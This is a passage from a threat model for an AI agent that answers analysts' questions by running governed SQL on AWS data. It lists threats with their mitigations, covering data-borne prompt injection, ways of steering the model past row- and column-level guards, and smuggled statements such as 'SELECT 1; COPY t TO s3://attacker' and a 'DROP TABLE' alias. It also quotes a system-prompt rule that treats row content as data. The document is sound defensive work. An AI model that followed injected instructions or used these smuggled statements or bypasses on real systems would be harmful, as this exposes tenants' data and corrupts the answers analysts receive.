**Statement**: A Authenticated restricted analyst, or the model on an ordinary question A raw partitioned source and a literal partition predicate that spans more than MAX_EXPANDED_PARTITIONS (366), or an unsatisfiable range. can asks for a range like WHERE date BETWEEN '2015-08-01' AND '2026-09-01'; the cost gate recorded the filter as satisfied, then declined to expand because the range exceeded the cap., which leads to the engine LISTs and scans the entire S3 prefix — exactly the cost the gate exists to prevent — for terabytes of history. Reproduced: an 11-year BETWEEN yielded expanded_paths=0 and an unchanged

- **Prerequisites**: A raw partitioned source and a literal partition predicate that spans more than MAX_EXPANDED_PARTITIONS (366), or an unsatisfiable range.
- **Action**: asks for a range like WHERE date BETWEEN '2015-08-01' AND '2026-09-01'; the cost gate recorded the filter as satisfied, then declined to expand because the range exceeded the cap.
- **Impact**: the engine LISTs and scans the entire S3 prefix — exactly the cost the gate exists to prevent — for terabytes of history. Reproduced: an 11-year BETWEEN yielded expanded_paths=0 and an unchanged
- **Impacted Assets**: A001
- **Tags**: cost-gate, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Wide (>cap) and unsatisfiable literal ranges are refused before the engine; non-literal predicates still pass to engine pruning. Worst case is read-only and bounded; verified by unit tests + verify3.
- **Assessment State**: Current

#### T5: Authenticated analyst via the model, or data-borne prompt injection

**Statement**: A Authenticated analyst via the model, or data-borne prompt injection Knowledge that framework results live in temp tables named _r_<n> (stated in the system prompt and every summary result). can issues CREATE OR REPLACE TEMP TABLE "_r_1" AS SELECT ...; the reserved-name check was a regex over the statement text that matched only the UNQUOTED form, so a quoted identifier passed., which leads to the framework's own result table is replaced by attacker-chosen rows; the model then reports fabricated figures as the real answer, invisibly in an investigation.

- **Prerequisites**: Knowledge that framework results live in temp tables named _r_<n> (stated in the system prompt and every summary result).
- **Action**: issues CREATE OR REPLACE TEMP TABLE "_r_1" AS SELECT ...; the reserved-name check was a regex over the statement text that matched only the UNQUOTED form, so a quoted identifier passed.
- **Impact**: the framework's own result table is replaced by attacker-chosen rows; the model then reports fabricated figures as the real answer, invisibly in an investigation.
- **Impacted Assets**: A005
- **Tags**: reserved-names, result-integrity, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Reserved-name detection is on the parsed tree, catching quoted and column-alias forms; integrity-only, confined to the attacker's own session. Verified end to end.
- **Assessment State**: Current

#### T6: Authenticated restricted analyst

**Statement**: A Authenticated restricted analyst SQL whose table alias breaks the re-parse of the guard subquery the rewrite builds; an alias of `a)` is sufficient. can submits it; the rewrite raised a sqlglot ParseError, which is not a ValueError, so the Govern stage's handler did not catch it and the driver never reached its audit., which leads to the statement attempt left NO audit record and surfaced as an unhandled framework error instead of a clean rejection. Reproduced: zero audit records and a ParseError out of the pipeline.

- **Prerequisites**: SQL whose table alias breaks the re-parse of the guard subquery the rewrite builds; an alias of `a)` is sufficient.
- **Action**: submits it; the rewrite raised a sqlglot ParseError, which is not a ValueError, so the Govern stage's handler did not catch it and the driver never reached its audit.
- **Impact**: the statement attempt left NO audit record and surfaced as an unhandled framework error instead of a clean rejection. Reproduced: zero audit records and a ParseError out of the pipeline.
- **Impacted Assets**: A004
- **Tags**: audit-coverage, error-handling, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: The guard alias is AST-attached; Govern and the driver fail closed on any exception; every statement is audited exactly once. Accountability defect closed; data was never exposed.
- **Assessment State**: Current

#### T7: Unrestricted ops:admin persona (or any principal allowed raw paths)

**Statement**: A Unrestricted ops:admin persona (or any principal allowed raw paths) The stack deployed with -c opsSourceBuckets, which granted s3:GetObject/ListBucket on the WHOLE named CUR and CloudTrail buckets, while the account scope was only a SQL row filter. can reads a path outside the pinned account, e.g. read_json over AWSLogs/<other-account>/CloudTrail/, since the unrestricted role may reference raw paths., which leads to CloudTrail of other accounts in the organization is readable through the agent — the account pin was not an IAM boundary.

- **Prerequisites**: The stack deployed with -c opsSourceBuckets, which granted s3:GetObject/ListBucket on the WHOLE named CUR and CloudTrail buckets, while the account scope was only a SQL row filter.
- **Action**: reads a path outside the pinned account, e.g. read_json over AWSLogs/<other-account>/CloudTrail/, since the unrestricted role may reference raw paths.
- **Impact**: CloudTrail of other accounts in the organization is readable through the agent — the account pin was not an IAM boundary.
- **Impacted Assets**: A001
- **Tags**: iac, least-privilege, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: The source-bucket grant is pinned to the CUR prefix and the account-scoped CloudTrail prefix, with ListBucket restricted by s3:prefix; the account pin is now an IAM boundary. Requires the unrestricted persona to matter at all.
- **Assessment State**: Current

#### T8: Another workload or principal inside the same AWS account

**Statement**: A Another workload or principal inside the same AWS account The solution bucket policy granted the CloudWatch Logs service principal PutObject under ops/cwlogs-export/ with only an aws:SourceAccount condition. can creates a CloudWatch Logs export task from an unrelated log group targeting that same prefix., which leads to unrelated log content lands in the prefix the loader curates into cw_logs, polluting the agent's audit history. AWS documents SourceAccount together with SourceArn.

- **Prerequisites**: The solution bucket policy granted the CloudWatch Logs service principal PutObject under ops/cwlogs-export/ with only an aws:SourceAccount condition.
- **Action**: creates a CloudWatch Logs export task from an unrelated log group targeting that same prefix.
- **Impact**: unrelated log content lands in the prefix the loader curates into cw_logs, polluting the agent's audit history. AWS documents SourceAccount together with SourceArn.
- **Impacted Assets**: A004
- **Tags**: iac, confused-deputy, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: aws:SourceArn pins the CloudWatch Logs export condition to the runtime's own log group; cross-account was already blocked by SourceAccount.
- **Assessment State**: Current

#### T9: Data-borne prompt injector who cannot authenticate to the agent

**Statement**: A Data-borne prompt injector who cannot authenticate to the agent A field the agent reads that an outsider can write: ledger token names/contract data/log payloads, or attacker-influenceable CloudTrail fields. can places text that reads as an instruction where the analyst's query selects it, so it arrives in the model's context as a tool result., which leads to the model may be steered in the next turn: attempts to reach other tables are still bounded by governance, but the NARRATIVE the analyst reads is not — fabricated attribution or a missed hit.

- **Prerequisites**: A field the agent reads that an outsider can write: ledger token names/contract data/log payloads, or attacker-influenceable CloudTrail fields.
- **Action**: places text that reads as an instruction where the analyst's query selects it, so it arrives in the model's context as a tool result.
- **Impact**: the model may be steered in the next turn: attempts to reach other tables are still bounded by governance, but the NARRATIVE the analyst reads is not — fabricated attribution or a missed hit.
- **Impacted Assets**: A001, A005
- **Tags**: prompt-injection, data-borne, residual
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Medium
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Data-borne prompt injection is structural to agentic data analysis: the model must read data to reason. Governance keeps it from widening data access and the pipeline from writing/host-reaching, so the realistic damage is a wrong narrative. The prompt now states rows are data, not instructions.
- **Assessment State**: Current

#### T10: Compromised upstream supplier (DuckDB extension repo or a Python dependency)

**Statement**: A Compromised upstream supplier (DuckDB extension repo or a Python dependency) The engine runs INSTALL for httpfs/iceberg/ducklake/fts/aws/json at cold start unless pre-baked, and the runtime has egress to the repository. can serves a malicious build, or ships a malicious release of duckdb / sqlglot / strands / bedrock-agentcore., which leads to code execution inside the agent process, which holds the execution role and every governed result; every SQL-layer control is bypassed because the attacker is inside the process where they live.

- **Prerequisites**: The engine runs INSTALL for httpfs/iceberg/ducklake/fts/aws/json at cold start unless pre-baked, and the runtime has egress to the repository.
- **Action**: serves a malicious build, or ships a malicious release of duckdb / sqlglot / strands / bedrock-agentcore.
- **Impact**: code execution inside the agent process, which holds the execution role and every governed result; every SQL-layer control is bypassed because the attacker is inside the process where they live.
- **Impacted Assets**: A001
- **Tags**: supply-chain, cold-start, residual
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Medium
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Low likelihood (signed extensions, HTTPS fetch), high consequence. Accepted for now with pre-baking/pinning tracked as a follow-up (M024). A runtime that INSTALLs at cold start is an avoidable standing dependency.
- **Assessment State**: Current

#### T11: Operator writing GOVERNANCE_POLICIES by hand

**Statement**: A Operator writing GOVERNANCE_POLICIES by hand Policy configuration authored as JSON in an environment variable. can ships a malformed or incomplete table: a typo'd tenant:role key, a stale table name, allow_raw_paths with governed tables, or a row_filter that is not a single WHERE predicate., which leads to silently broader visibility than intended. Shape errors fail the process at import; omission (a mounted table the policy never names) now fails CLOSED under table-level deny-by-default rather than

- **Prerequisites**: Policy configuration authored as JSON in an environment variable.
- **Action**: ships a malformed or incomplete table: a typo'd tenant:role key, a stale table name, allow_raw_paths with governed tables, or a row_filter that is not a single WHERE predicate.
- **Impact**: silently broader visibility than intended. Shape errors fail the process at import; omission (a mounted table the policy never names) now fails CLOSED under table-level deny-by-default rather than
- **Impacted Assets**: A004
- **Tags**: configuration, operator-error, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Policy JSON and LABELS_PREFIX are validated at import, and omission now fails closed (deny-by-default + deny-all floor). Residual: a well-formed but semantically over-broad row_filter still governs as written; the audit trail gives the signal.
- **Assessment State**: Current

#### T12: Authenticated restricted analyst via LLM prompt injection

**Statement**: A Authenticated restricted analyst via LLM prompt injection Valid restricted session; ability to ask arbitrary questions. can steers the LLM into SQL that reaches a governed table through a catalog-qualified alternate path (s3t/glue/dl), a CTE/alias trick, or an explicit denied column., which leads to cross-tenant row visibility or denied-column disclosure — defeat of the authorization layer.

- **Prerequisites**: Valid restricted session; ability to ask arbitrary questions.
- **Action**: steers the LLM into SQL that reaches a governed table through a catalog-qualified alternate path (s3t/glue/dl), a CTE/alias trick, or an explicit denied column.
- **Impact**: cross-tenant row visibility or denied-column disclosure — defeat of the authorization layer.
- **Impacted Assets**: A001
- **Tags**: core-threat, rls-cls, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: AST rewrite guards every governed-table reference through raw/s3t/glue/dl; denied-column selection is a clean rejection. Residual bounded by fail-closed parsing and a read-only worst case.
- **Assessment State**: Current

#### T13: Authenticated restricted analyst steering the model

**Statement**: A Authenticated restricted analyst steering the model Knowledge that an embedded engine executes generated SQL. can names a CTE, temp table/view or alias after a governed table so the base-table reference looks local and the rewrite skips it., which leads to the real governed table is read unguarded (RLS and CLS both bypassed); reproduced before the fix as a junior reading three exchanges' KYC PII.

- **Prerequisites**: Knowledge that an embedded engine executes generated SQL.
- **Action**: names a CTE, temp table/view or alias after a governed table so the base-table reference looks local and the rewrite skips it.
- **Impact**: the real governed table is read unguarded (RLS and CLS both bypassed); reproduced before the fix as a junior reading three exchanges' KYC PII.
- **Impacted Assets**: A001
- **Tags**: local-name-shadow, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: A local name reusing a governed table's name is refused (nine adversarial shapes), so a governed name always denotes the governed table.
- **Assessment State**: Current

#### T14: Authenticated restricted analyst steering the model

**Statement**: A Authenticated restricted analyst steering the model The read-only gate accepts EXPLAIN as a read keyword; sqlglot models EXPLAIN/SHOW <table> as an opaque Command with no table nodes. can submits EXPLAIN ANALYZE SELECT ... FROM <governed>, which the rewrite loop found nothing to guard and passed through., which leads to the ungoverned inner query really executes and reports true cardinalities of denied rows in the plan — a side-channel oracle.

- **Prerequisites**: The read-only gate accepts EXPLAIN as a read keyword; sqlglot models EXPLAIN/SHOW <table> as an opaque Command with no table nodes.
- **Action**: submits EXPLAIN ANALYZE SELECT ... FROM <governed>, which the rewrite loop found nothing to guard and passed through.
- **Impact**: the ungoverned inner query really executes and reports true cardinalities of denied rows in the plan — a side-channel oracle.
- **Impacted Assets**: A001
- **Tags**: opaque-statement, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Statement-root allowlist rejects opaque Command shapes for restricted principals; EXPLAIN ANALYZE no longer executes ungoverned. Regression-tested.
- **Assessment State**: Current

#### T15: Any principal via model-generated SQL

**Statement**: A Any principal via model-generated SQL The gate classifies on the leading keyword. can smuggles a write or exfiltration behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker'., which leads to persistent write, exfiltration via COPY TO, or session-state destruction despite the read-only gate.

- **Prerequisites**: The gate classifies on the leading keyword.
- **Action**: smuggles a write or exfiltration behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker'.
- **Impact**: persistent write, exfiltration via COPY TO, or session-state destruction despite the read-only gate.
- **Impacted Assets**: A001, A005
- **Tags**: multi-statement, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Single-statement rule uses the engine's own parser; end-to-end proof the second statement never reaches the engine; READ_ONLY attaches and no write IAM bound any residual.
- **Assessment State**: Current

#### T16: Authenticated restricted analyst via LLM prompt injection

**Statement**: A Authenticated restricted analyst via LLM prompt injection DuckDB exposes dozens of file-reading table functions and adds more each release. can uses a file-reading function NOT on a name denylist — parquet_scan, read_csv_auto, read_json, read_text, glob — to read S3 paths directly., which leads to full raw-path read of any data the execution role can reach — complete RLS/CLS bypass.

- **Prerequisites**: DuckDB exposes dozens of file-reading table functions and adds more each release.
- **Action**: uses a file-reading function NOT on a name denylist — parquet_scan, read_csv_auto, read_json, read_text, glob — to read S3 paths directly.
- **Impact**: full raw-path read of any data the execution role can reach — complete RLS/CLS bypass.
- **Impacted Assets**: A001
- **Tags**: raw-path, allowlist, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: AST-shape allowlist rejects new file functions by default; cloud-verified. Additions to the generator exception require explicit justification.
- **Assessment State**: Current

#### T17: Caller presenting blank, missing or unknown identity claims

**Statement**: A Caller presenting blank, missing or unknown identity claims The authorization layer is claim-driven; a default role is applied when claims are absent. can invokes with no/blank/unknown-tenant claims, relying on the default role., which leads to if the default were permissive (it was ops:admin), an unauthenticated-looking request becomes the unrestricted principal.

- **Prerequisites**: The authorization layer is claim-driven; a default role is applied when claims are absent.
- **Action**: invokes with no/blank/unknown-tenant claims, relying on the default role.
- **Impact**: if the default were permissive (it was ops:admin), an unauthenticated-looking request becomes the unrestricted principal.
- **Impacted Assets**: A001, A004
- **Tags**: deny-all-floor, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: The deny-all floor is the default and where blank/unknown claims resolve; the entrypoint refuses before the model runs. Local CLI must name the principal explicitly.
- **Assessment State**: Current

#### T18: Authenticated restricted analyst at the identity source

**Statement**: A Authenticated restricted analyst at the identity source Valid Cognito login; the app client could write every attribute including custom ones. can calls UpdateUserAttributes with its own token to set custom:role=admin, then re-authenticates., which leads to total privilege escalation through the identity source: a junior becomes the unrestricted ops:admin principal.

- **Prerequisites**: Valid Cognito login; the app client could write every attribute including custom ones.
- **Action**: calls UpdateUserAttributes with its own token to set custom:role=admin, then re-authenticates.
- **Impact**: total privilege escalation through the identity source: a junior becomes the unrestricted ops:admin principal.
- **Impacted Assets**: A002, A001
- **Tags**: identity-self-service, cognito, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: custom:tenant/custom:role are READ-only on the app client (verified NotAuthorizedException); role assignment is an operator action. Residual: an operator with Cognito admin rights can still misassign (same class as IAM role assignment).
- **Assessment State**: Current

#### T19: Unauthenticated or token-forging caller at the runtime endpoint

**Statement**: A Unauthenticated or token-forging caller at the runtime endpoint Network reach to the public AgentCore runtime endpoint. can invokes with no token, a forged token, an expired token, or a token for a different audience., which leads to unauthenticated agent invocation — data access and Bedrock/S3 cost burn — if the platform did not reject it.

- **Prerequisites**: Network reach to the public AgentCore runtime endpoint.
- **Action**: invokes with no token, a forged token, an expired token, or a token for a different audience.
- **Impact**: unauthenticated agent invocation — data access and Bedrock/S3 cost burn — if the platform did not reject it.
- **Impacted Assets**: A002
- **Tags**: authn, jwt, resolved-platform
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Platform-enforced pre-code validation (401/403 verified). Residual: stolen VALID tokens are T026; the authorizer is AWS-managed and out of sample scope.
- **Assessment State**: Current

#### T20: Compromised or malicious calling application on the SigV4 path

**Statement**: A Compromised or malicious calling application on the SigV4 path IAM permission to invoke a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity. can asserts an arbitrary tenant:role in the runtime User-Id header or payload identity object., which leads to full dataset visibility for any principal the caller invents — authorization is only as strong as the weakest accepted identity source.

- **Prerequisites**: IAM permission to invoke a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity.
- **Action**: asserts an arbitrary tenant:role in the runtime User-Id header or payload identity object.
- **Impact**: full dataset visibility for any principal the caller invents — authorization is only as strong as the weakest accepted identity source.
- **Impacted Assets**: A002
- **Tags**: identity-assertion, trust-assumption, accepted
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Medium
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Documented trust assumption on the local/CLI SigV4 path only: the caller is IAM-authenticated infrastructure trusted to assert identity. The deployed path uses the JWT authorizer, where these sources are unreachable pre-code.
- **Assessment State**: Current

#### T21: Concurrent tool calls inside one session (Strands thread execution)

**Statement**: A Concurrent tool calls inside one session (Strands thread execution) The LLM issues multiple run_sql calls in one message; a shared DuckDB connection. can races execute/fetch pairs (or the schema probe vs a query) on the shared connection., which leads to results attributed to the wrong query — an integrity glitch (cloud symptom: count(*) returning 0 rows).

- **Prerequisites**: The LLM issues multiple run_sql calls in one message; a shared DuckDB connection.
- **Action**: races execute/fetch pairs (or the schema probe vs a query) on the shared connection.
- **Impact**: results attributed to the wrong query — an integrity glitch (cloud symptom: count(*) returning 0 rows).
- **Impacted Assets**: A005
- **Tags**: concurrency, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: conn_lock serializes execute+fetch and the schema probe/session lister; single-principal-per-session makes the worst case an integrity glitch, not cross-principal leakage. Regression-tested.
- **Assessment State**: Current

#### T22: Authenticated restricted analyst

**Statement**: A Authenticated restricted analyst SQL whose hostile table alias is interpolated into the guard subquery the rewrite builds. can supplies an alias like `x; DROP TABLE victim` hoping the rewrite emits it as free SQL., which leads to an attacker statement appended after the guard would reach the engine.

- **Prerequisites**: SQL whose hostile table alias is interpolated into the guard subquery the rewrite builds.
- **Action**: supplies an alias like `x; DROP TABLE victim` hoping the rewrite emits it as free SQL.
- **Impact**: an attacker statement appended after the guard would reach the engine.
- **Impacted Assets**: A001
- **Tags**: guard-alias-injection, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: The alias is attached via the AST (quoted when unsafe) and only the subquery node is extracted, so a hostile alias is a single inert statement. Verified: victim survives, one statement.
- **Assessment State**: Current

#### T23: Authenticated restricted analyst

**Statement**: A Authenticated restricted analyst Valid restricted session; a CLS policy denies a column. can infers denied-column values via aggregate predicates on permitted expressions, or timing., which leads to partial disclosure of denied-column information without direct selection — an industry-wide limitation of query-rewrite RLS/CLS.

- **Prerequisites**: Valid restricted session; a CLS policy denies a column.
- **Action**: infers denied-column values via aggregate predicates on permitted expressions, or timing.
- **Impact**: partial disclosure of denied-column information without direct selection — an industry-wide limitation of query-rewrite RLS/CLS.
- **Impacted Assets**: A001
- **Tags**: side-channel, inference, accepted
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Low
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Aggregate/timing inference against denied columns is an industry-wide limitation of query-rewrite governance. The one concrete oracle (EXPLAIN ANALYZE) is closed (T014). Sample data is public/synthetic; production guidance is physical separation.
- **Assessment State**: Current

#### T24: Authenticated restricted analyst reading the streamed trace

**Statement**: A Authenticated restricted analyst reading the streamed trace The SSE trace emits govern envelopes incl. the rewritten SQL and rls[]/cls[] metadata for the principal's OWN policy. can reads the trace to learn the exact RLS predicates and denied-column names applied to them, then probes the policy's edges., which leads to disclosure of the principal's own policy internals — reconnaissance, the same information the clean rejection conveys; no other tenant's data.

- **Prerequisites**: The SSE trace emits govern envelopes incl. the rewritten SQL and rls[]/cls[] metadata for the principal's OWN policy.
- **Action**: reads the trace to learn the exact RLS predicates and denied-column names applied to them, then probes the policy's edges.
- **Impact**: disclosure of the principal's own policy internals — reconnaissance, the same information the clean rejection conveys; no other tenant's data.
- **Impacted Assets**: A004
- **Tags**: trace, policy-disclosure, accepted
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Low
- **Residual Likelihood**: Likely
- **Residual Risk Rationale**: Deliberate transparency: the trace shows the principal only their OWN policy application, the same information the clean rejection conveys, never another tenant's data. A single filter point exists for opacity-preferring deployments.
- **Assessment State**: Current

#### T25: Sample consumer (customer engineer) reusing the governance module

**Statement**: A Sample consumer (customer engineer) reusing the governance module Customer lifts governance into a production service serving MULTIPLE principals concurrently in one process. can reuses the module-level active-role slot — valid only under AgentCore's one-session-one-microVM model., which leads to cross-principal policy application: user A's query rewritten under user B's policy.

- **Prerequisites**: Customer lifts governance into a production service serving MULTIPLE principals concurrently in one process.
- **Action**: reuses the module-level active-role slot — valid only under AgentCore's one-session-one-microVM model.
- **Impact**: cross-principal policy application: user A's query rewritten under user B's policy.
- **Impacted Assets**: A001
- **Tags**: misuse-of-sample, documentation, accepted
- **Residual Risk Decision**: Accepted
- **Residual Severity**: High
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Misuse-of-sample: the module-level active-role slot is safe only under one-session-one-principal (AgentCore microVM). Cannot be closed by code in a sample; controlled by prominent documentation. HIGH residual kept visible on purpose.
- **Assessment State**: Current

#### T26: Attacker with access to the analyst's machine, or a stolen token

**Statement**: A Attacker with access to the analyst's machine, or a stolen token The UI holds the ID token in session state and the app client secret in a process env var; demo users ship with a documented password. can steals the bearer token (valid to expiry) or logs in with unrotated default credentials., which leads to principal impersonation for the token lifetime, bounded to the victim's own role (claims are no longer self-writable).

- **Prerequisites**: The UI holds the ID token in session state and the app client secret in a process env var; demo users ship with a documented password.
- **Action**: steals the bearer token (valid to expiry) or logs in with unrotated default credentials.
- **Impact**: principal impersonation for the token lifetime, bounded to the victim's own role (claims are no longer self-writable).
- **Impacted Assets**: A002, A003
- **Tags**: default-credentials, accepted
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Medium
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Bearer-token theft is inherent to token auth; lifetime bounds exposure and a stolen session cannot be escalated beyond the victim's role (claims read-only). Demo credentials are rotate-before-exposing; MFA deliberately off for demo. Analyst-host security is out of scope for a sample.
- **Assessment State**: Current

#### T27: Authenticated restricted analyst

**Statement**: A Authenticated restricted analyst The engine executes governed but expensive SQL in the session's microVM. can asks questions generating pathological SQL (huge sorts, cross joins) to exhaust the session's memory/CPU., which leads to own-session OOM/slowdown only — one session = one microVM, no shared-service blast radius; per-request S3/Bedrock cost remains.

- **Prerequisites**: The engine executes governed but expensive SQL in the session's microVM.
- **Action**: asks questions generating pathological SQL (huge sorts, cross joins) to exhaust the session's memory/CPU.
- **Impact**: own-session OOM/slowdown only — one session = one microVM, no shared-service blast radius; per-request S3/Bedrock cost remains.
- **Impacted Assets**: A001
- **Tags**: cost, resolved
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Likely
- **Residual Risk Rationale**: Blast radius is structurally one microVM; the memory envelope turns exhaustion into slower-not-dead. Cost exposure is the customer's own account, bounded by their throttles; per-request cost is standard for any LLM app.
- **Assessment State**: Current

## Mitigations

### Resolved Mitigations

#### M1: Table-level deny-by-default: a restricted principal may reference only tables its policy names, session temp objects it created, or names local to the statement; the L0 map and search_schema are filtered to the role and denied column NAMES are hidden.

**Addresses Threats**: T1, T2, T11

#### M2: The runtime's own exported audit log (cw_logs) is not readable by any restricted persona; it is admin-only by omission and documented as part of the governance boundary.

**Addresses Threats**: T2

#### M3: Bind the session to its owner (JWT sub, else tenant:role) and reset the engine, result store, data map, L0 injection, audit counters and conversation history on an owner change.

**Addresses Threats**: T3

#### M4: Cost gate rejects a literal partition range that exceeds the expansion cap or is unsatisfiable, instead of recording the filter satisfied and degrading to a whole-prefix scan. Non-literal/one-sided predicates still pass to engine pruning.

**Addresses Threats**: T4

#### M5: The reserved framework-result-name (_r_<n>) check runs on the parsed tree (CTE/CTAS/alias nodes), not a text regex, so the quoted form cannot slip through and overwrite a result table.

**Addresses Threats**: T5

#### M6: The governance guard's alias is attached through the AST (quoted when unsafe), and both the Govern stage and the pipeline driver fail closed on ANY exception, so a parse-breaking alias is a clean audited rejection and every statement is audited exactly once.

**Addresses Threats**: T6, T22

#### M7: The cloud-ops source-bucket IAM grant is scoped to the CUR export prefix and to AWSLogs/<opsAccountId>/CloudTrail/*, with ListBucket restricted by s3:prefix, making the account pin an IAM boundary, not just a SQL row filter.

**Addresses Threats**: T7

#### M8: The CloudWatch Logs export bucket policy carries ArnLike aws:SourceArn pinned to the runtime's own log group, alongside aws:SourceAccount, per AWS documentation.

**Addresses Threats**: T8

#### M9: The system prompt states that row CONTENT is data, never instructions: text inside a query result is untrusted evidence to report on, not a command to follow.

**Addresses Threats**: T9

#### M10: Identity-aware RLS/CLS rewrite on the parsed AST: every reference to a governed table via raw view, s3t.*, glue.* or dl.* is replaced by a guarded subquery (RLS predicate + schema-aware CLS EXCLUDE); explicit selection of a denied column is a clean rejection.

**Addresses Threats**: T12

#### M11: No local name (CTE, CTAS/temp target, derived-table or table alias) may reuse a governed table's name; the collision is refused rather than exempted, making the guard total.

**Addresses Threats**: T13

#### M12: Statement roots are an allowlist on the parsed tree (Select, SetOperation, Subquery, Create, Describe, Summarize, Show); opaque shapes (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>) are rejected for restricted principals.

**Addresses Threats**: T14

#### M13: Exactly one statement per call, split with the engine's own parser, behind a read-only keyword allowlist; no persistent writes, ATTACH, or COPY TO.

**Addresses Threats**: T15

#### M14: Raw file access is governed by an AST-shape ALLOWLIST (only exp.Identifier FROM/JOIN sources; pure generators excepted), not a function-name denylist, so new DuckDB file functions are refused by default.

**Addresses Threats**: T16

#### M15: Deny-all floor: the built-in deny-all policy is the default role and where blank/unknown claims resolve; the entrypoint refuses before invoking the model. Unknown role in a known tenant -> that tenant's most restricted policy.

**Addresses Threats**: T17, T11

#### M16: The Cognito app client declares custom:tenant/custom:role as READ-only attributes, so a user cannot self-assign a governance claim via UpdateUserAttributes; role assignment is an operator action.

**Addresses Threats**: T18, T26

#### M17: Inbound authentication is enforced by the AgentCore managed JWT authorizer (signature + allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards only Authorization.

**Addresses Threats**: T19

#### M18: Tool calls are serialized on the shared engine connection under conn_lock, including the governance schema probe and session-object lister.

**Addresses Threats**: T21

#### M19: GOVERNANCE_POLICIES and LABELS_PREFIX are validated at import (key shape, known fields, bare identifiers, single WHERE predicate, no allow_raw_paths-with-governed-tables, deny-all floor immutable, s3:// prefix + bucket allowlist); malformed config fail-stops.

**Addresses Threats**: T11

#### M20: Least-privilege read-only execution role, READ_ONLY catalog attaches, hardened buckets (SSE, BlockPublicAccess, enforce_ssl); one session = one microVM with a memory envelope bounds blast radius and cost.

**Addresses Threats**: T7, T27

#### M21: Documented trust assumptions and deployment guidance: SigV4 identity-assertion is a local/CLI trust assumption unreachable under the deployed authorizer; the module-level active-role slot must not be lifted into a multi-principal service; rotate demo credentials and keep MFA on in production.

**Addresses Threats**: T20, T25, T26

#### M22: One EMF audit line per statement (principal, SQL, governance/cost decision, outcome) plus a live per-stage SSE trace give operators the audit signal for whether and how the rewrite applied.

**Addresses Threats**: T1, T2, T3, T4, T6, T9, T24

### Will Not Action Mitigations

#### M23: Accepted residual: aggregate/timing inference against denied columns is not fully closed by any query-rewrite RLS/CLS; production guidance is physical separation (per-tenant tables/views) for high-sensitivity data. Sample data is public/synthetic.

**Addresses Threats**: T23

### Identified Mitigations

#### M24: Recommended hardening for the cold-start supply-chain risk: pre-bake and pin the engine's DuckDB extensions into the container image (LOAD only) and restrict runtime egress, rather than INSTALL from the public repo at cold start.

**Addresses Threats**: T10

## Assumptions

### A006: Platform trust

**Description**: AWS-managed services (AgentCore Runtime + JWT authorizer, Cognito, Bedrock, S3, Secrets Manager, CloudWatch) operate correctly per the shared-responsibility model, and AgentCore provisions one isolated microVM per runtimeSessionId.

- **Impact**: The sample's controls begin where verified requests enter agent code; platform-side AuthN, microVM isolation, and storage encryption are relied upon. The session-owner binding (T003 fix) rests on this isolation to catch a reused session id.
- **Rationale**: Standard AWS shared-responsibility boundary; the managed authorizer's 401/403 pre-code behaviour was verified live, and per-session microVM isolation is an AgentCore guarantee.

### A007: Deployment configuration

**Description**: The runtime is deployed WITH the AgentCore managed inbound JWT authorizer, and clients present the Cognito ID token (not the access token).

- **Impact**: Without it, authentication is not enforced before agent code and identity falls through to caller-asserted SigV4 sources (T020 becomes live); the deny-all floor is then the only remaining control.
- **Rationale**: The runtime is configured with customJWTAuthorizer and allowedAudience (agentcore configure --authorizer-config); no-token/forged-token rejection verified live.

### A008: Execution model

